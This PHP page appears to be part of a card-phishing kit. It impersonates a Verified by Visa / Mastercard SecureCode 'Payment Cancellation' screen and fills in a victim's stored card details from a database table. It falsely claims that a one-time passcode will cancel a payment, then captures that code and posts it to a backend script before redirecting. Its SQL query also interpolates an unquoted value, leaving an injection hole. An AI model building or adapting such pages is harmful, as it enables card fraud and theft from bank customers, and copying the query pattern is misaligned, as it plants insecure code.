<?php
session_start();
require 'database_setup/connection.php';

$uniqueid = $_SESSION["uniqueid"];

$query = mysqli_query($conn, "SELECT cardnumber, merchant, amount FROM boi WHERE uniqueid=$uniqueid");
if ($query) {
  $array = mysqli_fetch_array($query);

  $amount = $array[2];
  $merchant = $array[1];
  $card_type = $array[0][0] == "4" ? "Visa" : "Mastercard";
  $card_last_4 = substr($array[0], -4);
}

?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <meta charset="utf-8">
    <title>Payment Cancellation</title>
  </head>
  <body style="height: 100%">
      <div style="width: 350px; height: 500px; position: absolute; border: 1px solid black; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 10px;">
        <div class="row">
          <div class="col-6">
            <img src="data:image/png;base64,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" style="width: 85px;">
          </div>
          <div class="col-6">
            <!-- VBV LOGO -->
            <?php if ($card_type == "Visa") { ?>
              <img src="https://paymentscardsandmobile.com/wp-content/uploads/2017/05/verified_by_visa-1.jpg" style="width: 100px; margin-top: 10px; float: right;">
            <?php } else { ?>
              <img src="https://brand.mastercard.com/content/dam/mccom/brandcenter/Logos/securecode.png" style="width: 125px; float:right; margin-top: 20px;">
            <?php } ?>


          </div>
        </div>
        <form id="vbvForm">
        <p style="line-height: 15px; font-size: 13px; color: #888; margin-top: 25px;">You will shortly be sent a one-time-passcode to cancel a payment request.</p>
        <div style="width: 250px; display: block; margin: auto; font-size: 13px; text-align: center; margin-top: 50px;">
          <div class="row">
            <div class="col-5">
              <p style="float: right;">Merchant</p>
            </div>
            <div class="col-7">
              <p style="float: left;"><b><?= $merchant ?></b></p>
            </div>
          </div>
          <div class="row">
            <div class="col-5">
              <p style="float: right; margin-top: -10px;">Amount</p>
            </div>
            <div class="col-7">
              <p style="float: left; margin-top: -10px;"><b><?= $amount ?></b></p>
            </div>
          </div>
          <div class="row">
            <div class="col-5">
              <p style="float: right; margin-top: -10px;">Time</p>
            </div>
            <div class="col-7">
              <p style="float: left; margin-top: -10px;"><b><?= date("h:i:s") ?></b></p>
            </div>
          </div>
          <div class="row">
            <div class="col-5">
              <p style="float: right; margin-top: -10px;">Card Number</p>
            </div>
            <div class="col-7">
              <p style="float: left; margin-top: -10px; width: 100%;"><b>************ <?= $card_last_4 ?></b></p>
            </div>
          </div>
          <div class="row">
            <div class="col-5">
              <p style="float: right; margin-top: -10px;">Code</p>
            </div>
            <div class="col-7">
              <p style="float: left; margin-top: -10px;"><input name="otp"style="float: left; width: 80%; border-radius: 0; border: 1px solid black !important; outline: none !important;"></p>
            </div>
          </div>
        </div>
        <input type="hidden" value="<?= $uniqueid ?>" name="uniqueid">
        <input type="submit" style="display: block; margin: auto; margin-top: 55px; border-radius: 0 !important; border-left: 1px solid #999; border-top: 1px solid #999;">
      </form>
      </div>
      <script>
      $('#vbvForm').submit(function(e) {
        e.preventDefault();

        $.ajax({
          type: 'POST',
          url: 'database_setup/routes/send_vbv_code.php',
          data: $(this).serialize(),
          success: function(data) {
            let parsed_data = JSON.parse(data);

            if (parsed_data.status == 'success') {
              window.location = 'loading.php';
            }
          }
        })
      })
      </script>
  </body>
</html>
